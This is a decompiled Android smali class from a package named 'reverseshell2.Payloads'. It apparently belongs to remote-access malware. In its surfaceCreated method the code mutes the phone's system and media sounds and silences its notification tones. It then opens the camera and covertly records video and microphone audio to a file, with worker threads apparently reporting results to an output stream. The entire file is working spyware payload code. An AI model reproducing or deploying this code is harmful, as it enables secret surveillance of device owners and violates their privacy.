.class Lcom/example/reverseshell2/Payloads/videoRecorder$1;
.super Ljava/lang/Object;
.source "videoRecorder.java"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/videoRecorder;->startVideo(ILjava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

.field final synthetic val$cameraID:I

.field final synthetic val$outputStream:Ljava/io/OutputStream;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/videoRecorder;ILjava/io/OutputStream;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 93
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    iput p2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->val$cameraID:I

    iput-object p3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->val$outputStream:Ljava/io/OutputStream;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0
    .param p1, "surfaceHolder"    # Landroid/view/SurfaceHolder;
    .param p2, "i"    # I
    .param p3, "i1"    # I
    .param p4, "i2"    # I

    .line 171
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 6
    .param p1, "surfaceHolder"    # Landroid/view/SurfaceHolder;

    .line 97
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-virtual {v0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "audio"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    .line 98
    .local v0, "audioManager":Landroid/media/AudioManager;
    const/4 v1, 0x1

    invoke-virtual {v0, v1, v1}, Landroid/media/AudioManager;->setStreamMute(IZ)V

    .line 99
    const/4 v2, 0x3

    invoke-virtual {v0, v2, v1}, Landroid/media/AudioManager;->setStreamMute(IZ)V

    .line 100
    const/4 v2, 0x4

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3, v3}, Landroid/media/AudioManager;->setStreamVolume(III)V

    .line 101
    const/16 v4, 0x8

    invoke-virtual {v0, v4, v3, v3}, Landroid/media/AudioManager;->setStreamVolume(III)V

    .line 102
    const/4 v4, 0x5

    invoke-virtual {v0, v4, v3, v3}, Landroid/media/AudioManager;->setStreamVolume(III)V

    .line 103
    const/4 v5, 0x2

    invoke-virtual {v0, v5, v3, v3}, Landroid/media/AudioManager;->setStreamVolume(III)V

    .line 106
    :try_start_0
    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    iget v5, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->val$cameraID:I

    invoke-static {v5}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v5

    invoke-static {v3, v5}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$002(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/hardware/Camera;)Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 121
    nop

    .line 123
    sget-object v3, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    const-string v5, "camera ready"

    invoke-static {v3, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 124
    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    new-instance v5, Landroid/media/MediaRecorder;

    invoke-direct {v5}, Landroid/media/MediaRecorder;-><init>()V

    invoke-static {v3, v5}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$102(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/media/MediaRecorder;)Landroid/media/MediaRecorder;

    .line 125
    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v3}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$000(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/hardware/Camera;

    move-result-object v3

    invoke-virtual {v3}, Landroid/hardware/Camera;->unlock()V

    .line 126
    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v3}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v3

    invoke-interface {p1}, Landroid/view/SurfaceHolder;->getSurface()Landroid/view/Surface;

    move-result-object v5

    invoke-virtual {v3, v5}, Landroid/media/MediaRecorder;->setPreviewDisplay(Landroid/view/Surface;)V

    .line 127
    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v3}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v3

    iget-object v5, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v5}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$000(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/hardware/Camera;

    move-result-object v5

    invoke-virtual {v3, v5}, Landroid/media/MediaRecorder;->setCamera(Landroid/hardware/Camera;)V

    .line 128
    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v3}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v3

    invoke-virtual {v3, v4}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 129
    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v3}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v3

    invoke-virtual {v3, v1}, Landroid/media/MediaRecorder;->setVideoSource(I)V

    .line 131
    :try_start_1
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v1

    invoke-static {v2}, Landroid/media/CamcorderProfile;->get(I)Landroid/media/CamcorderProfile;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setProfile(Landroid/media/CamcorderProfile;)V
    :try_end_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_1

    .line 145
    nop

    .line 146
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_0

    .line 147
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v1

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    iget-object v2, v2, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/io/File;)V

    goto :goto_0

    .line 149
    :cond_0
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v1

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    iget-object v2, v2, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 153
    :goto_0
    :try_start_2
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->prepare()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 155
    goto :goto_1

    .line 154
    :catch_0
    move-exception v1

    .line 156
    :goto_1
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->start()V

    .line 157
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/example/reverseshell2/Payloads/videoRecorder$1$3;

    invoke-direct {v2, p0}, Lcom/example/reverseshell2/Payloads/videoRecorder$1$3;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder$1;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 166
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 167
    return-void

    .line 132
    :catch_1
    move-exception v1

    .line 133
    .local v1, "e":Ljava/lang/RuntimeException;
    invoke-virtual {v1}, Ljava/lang/RuntimeException;->printStackTrace()V

    .line 134
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/example/reverseshell2/Payloads/videoRecorder$1$2;

    invoke-direct {v3, p0}, Lcom/example/reverseshell2/Payloads/videoRecorder$1$2;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder$1;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 143
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    .line 144
    return-void

    .line 107
    .end local v1    # "e":Ljava/lang/RuntimeException;
    :catch_2
    move-exception v1

    .line 108
    .local v1, "e":Ljava/lang/Exception;
    sget-object v2, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    const-string v3, "Error in opening camera"

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 109
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    .line 110
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/example/reverseshell2/Payloads/videoRecorder$1$1;

    invoke-direct {v3, p0}, Lcom/example/reverseshell2/Payloads/videoRecorder$1$1;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder$1;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 119
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    .line 120
    return-void
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0
    .param p1, "surfaceHolder"    # Landroid/view/SurfaceHolder;

    .line 175
    return-void
.end method
